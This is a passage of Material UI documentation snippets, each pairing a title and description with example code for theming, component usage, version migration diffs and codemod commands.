colorSchemes: {\n    light: {\n      // This creates a 1px box-shadow.\n      shadowRing: '0 0 0 1px rgba(0 0 0 / 0.1)',\n    },\n    dark: {\n      shadowChannel: '0 0 0 1px rgba(255 255 255 / 0.1)',\n    },\n  },\n});\n\n// Then, pass it to `<CssVarsProvider theme={theme}>`.\n```\n\n----------------------------------------\n\nTITLE: Setting Root ID on Autocomplete Component\nDESCRIPTION: Two equivalent examples of setting an ID on the Autocomplete component's root element.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/overriding-component-structure/overriding-component-structure.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Autocomplete id=\"badge1\">\n```\n\nLANGUAGE: jsx\nCODE:\n```\n<Autocomplete slotProps={{ root: { id: 'badge1' } }}>\n```\n\n----------------------------------------\n\nTITLE: Renaming createMuiTheme to createTheme\nDESCRIPTION: Diff showing the renaming of createMuiTheme function to createTheme for more intuitive usage with ThemeProvider.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_26\n\nLANGUAGE: diff\nCODE:\n```\n-import { createMuiTheme } from '@mui/material/styles';\n+import { createTheme } from '@mui/material/styles';\n\n-const theme = createMuiTheme({\n+const theme = createTheme({\n```\n\n----------------------------------------\n\nTITLE: Importing Adapter for date-fns v3.x - React JavaScript\nDESCRIPTION: This code snippet demonstrates how to import the AdapterDateFns adapter for usage with date-fns v3.x in MUI X Date Pickers. Prerequisites include installation of '@mui/x-date-pickers' and 'date-fns@^3'. The import exposes date-fns v3-specific parsing and formatting through the MUI X API. Use this adapter as the 'dateAdapter' prop with Date/Time Picker components to ensure compatibility with date-fns v3. Limitations: AdapterDateFnsV3 is not compatible with earlier date-fns versions.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v7-beta.md#2025-04-22_snippet_3\n\nLANGUAGE: JSX\nCODE:\n```\n// date-fns v3.x\nimport { AdapterDateFns } from '@mui/x-date-pickers/AdapterDateFnsV3';\n```\n\n----------------------------------------\n\nTITLE: Using Standalone DateField from @mui/x-date-pickers in React (JSX)\nDESCRIPTION: Illustrates how to use the standalone DateField component from @mui/x-date-pickers for capturing date input in a form. Requires @mui/x-date-pickers installed as a dependency. The key parameter is label, which sets the field label for the UI. Input is user-entered date text, and output is a controlled or uncontrolled DateField value suitable for use in forms.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v6.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nimport { DateField } from '@mui/x-date-pickers/DateField';\n\n<DateField label=\"My first field\" />;\n```\n\n----------------------------------------\n\nTITLE: Preventing Default Key Handler Behavior in Autocomplete (JSX)\nDESCRIPTION: This snippet demonstrates how to prevent the default key handler behavior in the Autocomplete component by setting the event's defaultMuiPrevented property to true. It specifically shows how to handle the 'Enter' key press event.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/autocomplete/autocomplete.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\n<Autocomplete\n  onKeyDown={(event) => {\n    if (event.key === 'Enter') {\n      // Prevent's default 'Enter' behavior.\n      event.defaultMuiPrevented = true;\n      // your handler code\n    }\n  }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Updating CSS Keyframes Animation Syntax\nDESCRIPTION: Diff showing the updated syntax for CSS keyframes in JSS, requiring the $ prefix for animation names to properly scope animations.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_6\n\nLANGUAGE: diff\nCODE:\n```\n  rippleVisible: {\n    opacity: 0.3,\n-   animation: 'mui-ripple-enter 100ms cubic-bezier(0.4, 0, 0.2, 1)',\n+   animation: '$mui-ripple-enter 100ms cubic-bezier(0.4, 0, 0.2, 1)',\n  },\n  '@keyframes mui-ripple-enter': {\n    '0%': {\n      opacity: 0.1,\n    },\n    '100%': {\n      opacity: 0.3,\n    },\n  },\n```\n\n----------------------------------------\n\nTITLE: Function-based Theme Spacing in Material-UI\nDESCRIPTION: Illustrates spacing transformation when theme spacing is configured as a function. The function is called with the prop value to calculate the margin.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/spacing/spacing.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nconst theme = {\n  spacing: value => value * 2,\n}\n\n<Box sx={{ m: 0 }} /> // margin: 0px;\n<Box sx={{ m: 2 }} /> // margin: 4px;\n```\n\n----------------------------------------\n\nTITLE: Converting Array-based Padding Values with Units\nDESCRIPTION: Example showing how to convert JSS array-based padding values to string-based values with appropriate units for Emotion.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\nconst theme = createTheme({\n  overrides: {\n    MuiOutlinedInput: {\n      root: {\n        padding: [[5, 8, 6]],\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Applying Custom Theme to CssVarsProvider\nDESCRIPTION: Example of implementing the custom theme with CssVarsProvider component\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nimport { CssVarsProvider, extendTheme } from '@mui/joy/styles';\n\nconst theme = extendTheme({ … });\n\nfunction App() {\n  return <CssVarsProvider theme={theme}>…</CssVarsProvider>;\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Custom Theme Tokens in Material-UI\nDESCRIPTION: Shows how to add custom key-value pairs to the theme input, which will be generated as part of the CSS theme variables. This example adds gradient and border tokens for both light and dark modes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/css-theme-variables/usage.md#2025-04-22_snippet_4\n\nLANGUAGE: js\nCODE:\n```\nconst theme = createTheme({\n  cssVariables: true,\n  colorSchemes: {\n    light: {\n      palette: {\n        gradient:\n          'linear-gradient(to left, var(--mui-palette-primary-main), var(--mui-palette-primary-dark))',\n        border: {\n          subtle: 'var(--mui-palette-neutral-200)',\n        },\n      },\n    },\n    dark: {\n      palette: {\n        gradient:\n          'linear-gradient(to left, var(--mui-palette-primary-light), var(--mui-palette-primary-main))',\n        border: {\n          subtle: 'var(--mui-palette-neutral-600)',\n        },\n      },\n    },\n  },\n});\n\nfunction App() {\n  return <ThemeProvider theme={theme}>...</ThemeProvider>;\n}\n```\n\n----------------------------------------\n\nTITLE: Migrating DatePicker Variant Usage\nDESCRIPTION: Shows how to migrate from variant-based DatePicker to dedicated Desktop/Mobile components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/pickers-migration/pickers-migration.md#2025-04-22_snippet_1\n\nLANGUAGE: diff\nCODE:\n```\n-import { DatePicker } from '@material-ui/pickers';\n+import DesktopDatePicker from '@mui/lab/DesktopDatePicker';\n\n-<DatePicker variant=\"inline\" />\n+<DesktopDatePicker />\n```\n\n----------------------------------------\n\nTITLE: Defining Custom Transform Function for Sizing Props in Material UI System JS\nDESCRIPTION: Presents the JavaScript transform function used internally by Material UI System for sizing properties (`width`, `height`, `minHeight`, `maxHeight`, `minWidth`, `maxWidth`). Values between 0 and 1 (exclusive of 0) are converted to percentages; otherwise, they are treated as pixel values.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_9\n\nLANGUAGE: js\nCODE:\n```\nfunction transform(value) {\n  return value <= 1 && value !== 0 ? `${value * 100}%` : value;\n}\n```\n\n----------------------------------------\n\nTITLE: Rendering Material UI Showcase Component\nDESCRIPTION: Component inclusion directive for the Material UI showcase module that displays example applications. Uses a custom component syntax to inject the MaterialShowcase.js module.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/discover-more/showcase/showcase.md#2025-04-22_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\"component\": \"modules/components/MaterialShowcase.js\"}\n```\n\n----------------------------------------\n\nTITLE: Updating IconButton Size in React\nDESCRIPTION: Changes the default size of IconButton and introduces a new 'large' size prop for the previous default size.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_20\n\nLANGUAGE: diff\nCODE:\n```\n- <IconButton>\n+ <IconButton size=\"large\">\n```\n\n----------------------------------------\n\nTITLE: Theme configuration example to avoid variant-prop codemod\nDESCRIPTION: Example showing a theme configuration that sets the default variant to 'outlined'. If this configuration is present, you should not run the variant-prop codemod as it would conflict with your theme settings.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migration-v4.md#2025-04-22_snippet_15\n\nLANGUAGE: js\nCODE:\n```\n// ❌ if you have a theme setup like this, don't run this codemod.\n// these default props can be removed later because `outlined` is the default value in v5\ncreateMuiTheme({\n  components: {\n    MuiTextField: {\n      defaultProps: {\n        variant: 'outlined',\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Implementing Grid Display Property with MUI Box\nDESCRIPTION: Examples of setting up a grid container using the display property with values 'grid' and 'inline-grid'.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/grid/grid.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ display: 'grid' }}>…</Box>\n<Box sx={{ display: 'inline-grid' }}>…</Box>\n```\n\n----------------------------------------\n\nTITLE: Restoring Old MUI Joy UI Tabs Design using extendTheme in JavaScript\nDESCRIPTION: Demonstrates how to revert the MUI Joy UI `Tabs` component design to its previous appearance using `extendTheme`. It overrides default props (`variant`, `disableUnderline`, `disableIndicator`) and applies specific style overrides to `JoyTabList` and `JoyTab` components to replicate the old look and feel.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_19\n\nLANGUAGE: javascript\nCODE:\n```\nextendTheme({\n  components: {\n    JoyTabList: {\n      defaultProps: {\n        variant: 'soft',\n        disableUnderline: true,\n      },\n      styleOverrides: {\n        root: {\n          gap: '0.25rem',\n          padding: '0.25rem',\n          '--List-padding': '0.25rem',\n          borderRadius: 'var(--joy-radius-xl)',\n          '--List-radius': 'var(--joy-radius-xl)',\n        },\n      },\n    },\n    JoyTab: {\n      defaultProps: {\n        disableIndicator: true,\n      },\n      styleOverrides: {\n        root: {\n          '&[aria-selected=\"true\"]': {\n            boxShadow: 'var(--joy-shadow-sm)',\n            backgroundColor: 'var(--joy-palette-background-surface)',\n          },\n        },\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Running Backdrop Props Codemod\nDESCRIPTION: Command to automatically migrate Backdrop component props using the MUI codemod tool.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest deprecations/backdrop-props <path>\n```\n\n----------------------------------------\n\nTITLE: Updating Grid Size Props for Object Syntax\nDESCRIPTION: Shows how to convert individual breakpoint props to the new object-based size prop syntax in Material UI v6/v7.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-grid-v2/upgrade-to-grid-v2.md#2025-04-22_snippet_4\n\nLANGUAGE: diff\nCODE:\n```\n <Grid\n-  xs={12}\n-  sm={6}\n+  size={{ xs: 12, sm: 6 }}\n >\n```\n\n----------------------------------------\n\nTITLE: Using augmentColor for Custom Palette Colors\nDESCRIPTION: Demonstrates how to use the augmentColor utility to generate light, dark, and contrastText tokens based on a main color value.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/palette/palette.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\nimport { createTheme } from '@mui/material/styles';\n\nlet theme = createTheme({\n  // Theme customization goes here as usual, including tonalOffset and/or\n  // contrastThreshold as the augmentColor() function relies on these\n});\n\ntheme = createTheme(theme, {\n  // Custom colors created with augmentColor go here\n  palette: {\n    salmon: theme.palette.augmentColor({\n      color: {\n        main: '#FF5733',\n      },\n      name: 'salmon',\n    }),\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Server-Side Rendering with Masonry\nDESCRIPTION: Demonstrates server-side rendering implementation using defaultHeight, defaultColumns, and defaultSpacing props.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/masonry/masonry.md#2025-04-22_snippet_8\n\nLANGUAGE: jsx\nCODE:\n```\nSSRMasonry.js\n```\n\n----------------------------------------\n\nTITLE: Setting Up Dark Mode in Next.js App Router with Joy UI\nDESCRIPTION: Configures a Next.js App Router project to support dark mode with Joy UI, preventing screen flickering on initial load by using InitColorSchemeScript in the root layout file.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/dark-mode/dark-mode.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\nimport InitColorSchemeScript from '@mui/joy/InitColorSchemeScript';\nimport { CssVarsProvider } from '@mui/joy/styles';\nimport CssBaseline from '@mui/joy/CssBaseline';\n\nexport default function RootLayout(props) {\n  return (\n    <html lang=\"en\" suppressHydrationWarning={true}>\n      <body>\n        <InitColorSchemeScript />\n        <CssVarsProvider>\n          <CssBaseline />\n          {props.children}\n        </CssVarsProvider>\n      </body>\n    </html>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing Base UI Components using slots and slotProps in TSX\nDESCRIPTION: Demonstrates the current method for customizing Base UI components using the `slots` prop to change the underlying HTML element (e.g., changing Select's listbox to 'ol') and the `slotProps` prop to pass attributes to specific slots (e.g., adding a class to Badge's badge element). This API is mentioned as potentially being revised.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/base-ui-2024-plans.md#2025-04-22_snippet_0\n\nLANGUAGE: tsx\nCODE:\n```\n// Example of the slots prop\n<Select slots={{ listbox: 'ol' }} defaultValue=\"First option\">\n  <Option value=\"First option\">First option</Option>\n  <Option value=\"Second option\">Second option</Option>\n</Select>\n\n// Example of the slotProps prop\n<Badge slotProps={{ badge: { className: 'my-badge' } }} />\n```\n\n----------------------------------------\n\nTITLE: Stack Component HTML Structure\nDESCRIPTION: The basic HTML structure of the Stack component showing the root div element with its class.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/components/stack/stack.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<div class=\"MuiStack-root\">\n  <!-- Stack contents -->\n</div>\n```\n\n----------------------------------------\n\nTITLE: Updating `useThemeVariants` Import in JavaScript/JSX\nDESCRIPTION: Shows how to update the import path for the `useThemeVariants` hook. In MUI v5, this hook is no longer exported from '@mui/material/styles' and should be imported from the deprecated '@mui/styles' package if needed during migration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_33\n\nLANGUAGE: diff\nCODE:\n```\n-import { useThemeVariants } from '@mui/material/styles';\n+import { useThemeVariants } from '@mui/styles';\n```\n\n----------------------------------------\n\nTITLE: Configuring Text Alignment in Material-UI with JSX\nDESCRIPTION: Shows how to set text alignment (left, center, right) using the Box component in Material-UI. This affects how text is positioned within its container.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/typography/typography.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ textAlign: 'left' }}>…\n<Box sx={{ textAlign: 'center' }}>…\n<Box sx={{ textAlign: 'right' }}>…\n```\n\n----------------------------------------\n\nTITLE: Identifying Dependency Issues with npm for Material UI v5 Migration\nDESCRIPTION: Shows how to use npm to check for remaining v4 dependencies that might be causing style issues after migration. The example shows that @material-ui/core is still present as a dependency of @mui/x-data-grid.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/troubleshooting.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ npm ls @material-ui/core\nproject@0.1.0 /path/to/project\n└─┬  @mui/x-data-grid@4.0.0\n  └── @material-ui/core@4.12.3\n```\n\n----------------------------------------\n\nTITLE: Configuring Webpack Resolution for MUI Styles\nDESCRIPTION: Webpack configuration to resolve @mui/styles module conflicts by setting explicit alias resolution.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/faq/faq.md#2025-04-22_snippet_9\n\nLANGUAGE: diff\nCODE:\n```\n resolve: {\n+  alias: {\n+    '@mui/styles': path.resolve(appFolder, 'node_modules', '@mui/styles'),\n+  },\n },\n```\n\n----------------------------------------\n\nTITLE: Incorrect CSS Specificity for MUI Components\nDESCRIPTION: CSS example showing an incorrect approach to styling Material UI components that will not work due to insufficient specificity.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migration-v4.md#2025-04-22_snippet_13\n\nLANGUAGE: css\nCODE:\n```\n.green {\n  color: green;\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Line Height in Material-UI with JSX\nDESCRIPTION: Illustrates how to set line height using the Box component in Material-UI. It shows using the 'normal' keyword and a specific pixel value.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/typography/typography.md#2025-04-22_snippet_8\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ lineHeight: 'normal' }}>…\n<Box sx={{ lineHeight: 10 }}>…\n```\n\n----------------------------------------\n\nTITLE: Setting Align Self with Material-UI Box Component in JSX\nDESCRIPTION: Shows how to override the alignItems value for individual flex items using the alignSelf property. This allows individual items to have different alignment on the cross axis.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/flexbox/flexbox.md#2025-04-22_snippet_9\n\nLANGUAGE: jsx\nCODE:\n```\n<Box>Item 1</Box>\n<Box sx={{ alignSelf: 'flex-end' }}>Item 2</Box>\n<Box>Item 3</Box>\n```\n\n----------------------------------------\n\nTITLE: Using Stack with White Space Nowrap and Min Width\nDESCRIPTION: Example showing how to handle white-space: nowrap with Stack by setting minWidth: 0 to prevent overflow issues.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/components/stack/stack.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Stack direction=\"row\">\n  <span style={{ whiteSpace: 'nowrap' }}>\n```\n\n----------------------------------------\n\nTITLE: Running Root Ref Codemod Command\nDESCRIPTION: Command to execute the root-ref codemod on a specified path. This removes RootRef usage from the codebase as it has been deprecated in Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_106\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/root-ref <path>\n```\n\n----------------------------------------\n\nTITLE: Equivalent Usage of sx with theme.spacing Function - MUI - JSX\nDESCRIPTION: Shows how to use the sx prop with an explicit function referencing theme.spacing inside a React component. This is equivalent to the shorthand key usage and allows for dynamic calculations based on the current theme. Requires MUI's theme context and React. Input: number (3). Output: marginBottom set to theme.spacing(3).\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/properties/properties.md#2025-04-22_snippet_4\n\nLANGUAGE: JSX\nCODE:\n```\n<Button sx={{ marginBottom: theme => theme.spacing(3)}} />\n```\n\n----------------------------------------\n\nTITLE: String-based Spacing in Material-UI\nDESCRIPTION: Shows how string values are handled in spacing props. String values are passed directly as raw CSS values.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/spacing/spacing.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ m: '2rem' }} /> // margin: 2rem;\n<Box sx={{ mx: 'auto' }} /> // margin-left: auto; margin-right: auto;\n```\n\n----------------------------------------\n\nTITLE: Importing Roboto Font Weights in React\nDESCRIPTION: TypeScript/JavaScript code to import specific weights of the Roboto font in a React application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/typography/typography.md#2025-04-22_snippet_1\n\nLANGUAGE: tsx\nCODE:\n```\nimport '@fontsource/roboto/300.css';\nimport '@fontsource/roboto/400.css';\nimport '@fontsource/roboto/500.css';\nimport '@fontsource/roboto/700.css';\n```\n\n----------------------------------------\n\nTITLE: Setting Up Express Server Skeleton for SSR\nDESCRIPTION: Creates the basic structure of an Express server with placeholder functions for rendering and request handling. This outline will be filled with the actual implementation code in the following sections.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/server-rendering/server-rendering.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport express from 'express';\n\n// We are going to fill these out in the sections to follow.\nfunction renderFullPage(html, css) {\n  /* ... */\n}\n\nfunction handleRender(req, res) {\n  /* ... */\n}\n\nconst app = express();\n\n// This is fired every time the server-side receives a request.\napp.use(handleRender);\n\nconst port = 3000;\napp.listen(port);\n```\n\n----------------------------------------\n\nTITLE: Implementing Accessible Tabs with TabContext API in Material-UI\nDESCRIPTION: Example demonstrating the new experimental TabContext API implementation that follows WAI-ARIA authoring practices for accessible tabs. Shows basic tab structure with TabList, Tab components and TabPanel content areas.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2020-q2-update.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\n<TabContext value={value}>\n  <TabList onChange={handleChange} aria-label=\"simple tabs example\">\n    <Tab label=\"Item One\" value=\"1\" />\n    <Tab label=\"Item Two\" value=\"2\" />\n    <Tab label=\"Item Three\" value=\"3\" />\n  </TabList>\n  <TabPanel value=\"1\">Item One</TabPanel>\n  <TabPanel value=\"2\">Item Two</TabPanel>\n  <TabPanel value=\"3\">Item Three</TabPanel>\n</TabContext>\n```\n\n----------------------------------------\n\nTITLE: Importing Palette Function from Material-UI System\nDESCRIPTION: This snippet shows how to import the palette function from the Material-UI system package. The palette function provides access to color-related utilities for custom styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/palette/palette.md#2025-04-22_snippet_2\n\nLANGUAGE: js\nCODE:\n```\nimport { palette } from '@mui/system';\n```\n\n----------------------------------------\n\nTITLE: Configuring Warning Color Palette in Joy UI Theme\nDESCRIPTION: Defines a warning color palette with shades from 50 to 900 and configures component states for light and dark themes. This includes styling for plain, outlined, soft, and solid variant states.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\nconst warning = {\n  50: '#FFF8C5',\n  100: '#FAE17D',\n  200: '#EAC54F',\n  300: '#D4A72C',\n  400: '#BF8700',\n  500: '#9A6700',\n  600: '#7D4E00',\n  700: '#633C01',\n  800: '#4D2D00',\n  900: '#3B2300',\n};\n\nextendTheme({\n  colorSchemes: {\n    light: {\n      palette: {\n        warning: {\n          ...warning,\n          plainColor: `var(--joy-palette-warning-800)`,\n          plainHoverBg: `var(--joy-palette-warning-50)`,\n          plainActiveBg: `var(--joy-palette-warning-200)`,\n          plainDisabledColor: `var(--joy-palette-warning-200)`,\n\n          outlinedColor: `var(--joy-palette-warning-800)`,\n          outlinedBorder: `var(--joy-palette-warning-200)`,\n          outlinedHoverBg: `var(--joy-palette-warning-50)`,\n          outlinedHoverBorder: `var(--joy-palette-warning-300)`,\n          outlinedActiveBg: `var(--joy-palette-warning-200)`,\n          outlinedDisabledColor: `var(--joy-palette-warning-100)`,\n          outlinedDisabledBorder: `var(--joy-palette-warning-100)`,\n\n          softColor: `var(--joy-palette-warning-800)`,\n          softBg: `var(--joy-palette-warning-50)`,\n          softHoverBg: `var(--joy-palette-warning-100)`,\n          softActiveBg: `var(--joy-palette-warning-200)`,\n          softDisabledColor: `var(--joy-palette-warning-200)`,\n          softDisabledBg: `var(--joy-palette-warning-50)`,\n\n          solidColor: `var(--joy-palette-warning-800)`,\n          solidBg: `var(--joy-palette-warning-200)`,\n          solidHoverBg: `var(--joy-palette-warning-300)`,\n          solidActiveBg: `var(--joy-palette-warning-400)`,\n          solidDisabledColor: `var(--joy-palette-warning-200)`,\n          solidDisabledBg: `var(--joy-palette-warning-50)`,\n        },\n      },\n    },\n    dark: {\n      palette: {\n        warning: {\n          ...warning,\n          plainColor: `var(--joy-palette-warning-300)`,\n          plainHoverBg: `var(--joy-palette-warning-800)`,\n          plainActiveBg: `var(--joy-palette-warning-700)`,\n          plainDisabledColor: `var(--joy-palette-warning-800)`,\n\n          outlinedColor: `var(--joy-palette-warning-200)`,\n          outlinedBorder: `var(--joy-palette-warning-700)`,\n          outlinedHoverBg: `var(--joy-palette-warning-800)`,\n          outlinedHoverBorder: `var(--joy-palette-warning-600)`,\n          outlinedActiveBg: `var(--joy-palette-warning-900)`,\n          outlinedDisabledColor: `var(--joy-palette-warning-800)`,\n          outlinedDisabledBorder: `var(--joy-palette-warning-800)`,\n\n          softColor: `var(--joy-palette-warning-200)`,\n          softBg: `var(--joy-palette-warning-900)`,\n          softHoverBg: `var(--joy-palette-warning-800)`,\n          softActiveBg: `var(--joy-palette-warning-700)`,\n          softDisabledColor: `var(--joy-palette-warning-800)`,\n          softDisabledBg: `var(--joy-palette-warning-900)`,\n\n          solidColor: `var(--joy-palette-common-black)`,\n          solidBg: `var(--joy-palette-warning-300)`,\n          solidHoverBg: `var(--joy-palette-warning-400)`,\n          solidActiveBg: `var(--joy-palette-warning-500)`,\n          solidDisabledColor: `var(--joy-palette-warning-700)`,\n          solidDisabledBg: `var(--joy-palette-warning-900)`,\n        },\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Implementing Dynamic Button Variants with Material-UI Theme in TypeScript\nDESCRIPTION: This snippet demonstrates how to add new variants to Material-UI components using the theme. It shows the creation of a 'dashed' variant for the Button component, including type safety declarations.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2020-q3-update.md#2025-04-22_snippet_0\n\nLANGUAGE: TypeScript\nCODE:\n```\n// Define the style that should be applied for specific props.\nconst theme = createMuiTheme({\n  components: {\n    MuiButton: {\n      variants: [\n        {\n          props: { variant: 'dashed', color: 'secondary' },\n          styles: {\n            border: `4px dashed ${red[500]}`,\n          },\n        },\n      ],\n    },\n  },\n});\n\n// Optionally retain type safety:\ndeclare module '@mui/material/Button' {\n  interface ButtonPropsVariantOverrides {\n    dashed: true;\n  }\n}\n\n// Enjoy!\n<Button variant=\"dashed\" color=\"secondary\" />;\n```\n\n----------------------------------------\n\nTITLE: TypeScript Interface Augmentation for Custom Sizes in Joy UI\nDESCRIPTION: Demonstrates how to add type safety for custom size values using TypeScript module augmentation, enabling proper type checking with custom sizes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/themed-components/themed-components.md#2025-04-22_snippet_10\n\nLANGUAGE: typescript\nCODE:\n```\n// This part could be declared in your theme file\ndeclare module '@mui/joy/Button' {\n  interface ButtonPropsSizeOverrides {\n    xs: true;\n    xl: true;\n  }\n}\n\n// typed-safe\n<Button size=\"xs\" />\n<Button size=\"xl\" />\n```\n\n----------------------------------------\n\nTITLE: Running the svg-icon-imports codemod\nDESCRIPTION: Command to execute the codemod that updates SVG icon import paths for Material UI v1.0.0.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_127\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v1.0.0/svg-icon-imports <path>\n```\n\n----------------------------------------\n\nTITLE: Configuring Next.js Font Optimization with Pigment CSS\nDESCRIPTION: A diff snippet showing how to configure Next.js font optimization to work with Pigment CSS by using CSS variables.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_9\n\nLANGUAGE: diff\nCODE:\n```\n import { Roboto } from 'next/font/google';\n\n const roboto = Roboto({\n   weight: ['300', '400', '500', '700'],\n   subsets: ['latin'],\n   display: 'swap',\n+  variable: '--my-font-family',\n });\n\nexport default function RootLayout(props) {\n   const { children } = props;\n   return (\n     <html lang=\"en\">\n+      <body className={roboto.variable}>\n          {children}\n       </body>\n     </html>\n   );\n }\n```\n\n----------------------------------------\n\nTITLE: Importing Snackbar Component in React\nDESCRIPTION: Basic import statement for using the Snackbar component from Joy UI in a React application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/snackbar/snackbar.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Snackbar from '@mui/joy/Snackbar';\n```\n\n----------------------------------------\n\nTITLE: Displaying GitHub Avatar using HTML img Tag (Instance 2)\nDESCRIPTION: Embeds a different GitHub user's avatar image using an HTML `<img>` tag sourced from GitHub avatars. Inline CSS styles are applied via the `style` attribute to control the maximum width (160px), remove default margins (`margin: unset`), add bottom margin (24px), and apply slightly rounded corners (2px). Note the `alt` attribute has a potential typo ('marija') which is preserved from the original source.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2020-q3-update.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<img src=\"https://avatars.githubusercontent.com/u/5858539?s=320\" alt=\"marija\" style=\"max-width: 160px; margin: unset; margin-bottom: 24px; border-radius: 2px;\" />\n```\n\n----------------------------------------\n\nTITLE: Migrating Typography Color Prop to sx Prop in React\nDESCRIPTION: Updating Typography components to use the sx prop for dynamic color values instead of the color prop, which is no longer a system prop in Material UI v6.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_18\n\nLANGUAGE: diff\nCODE:\n```\n-<Typography color={(theme) => theme.palette.primary.main}>\n+<Typography sx={{ color: (theme) => theme.palette.primary.main }}>\n```\n\n----------------------------------------\n\nTITLE: Installing MUI Icons Package with npm\nDESCRIPTION: Command to install the MUI Icons 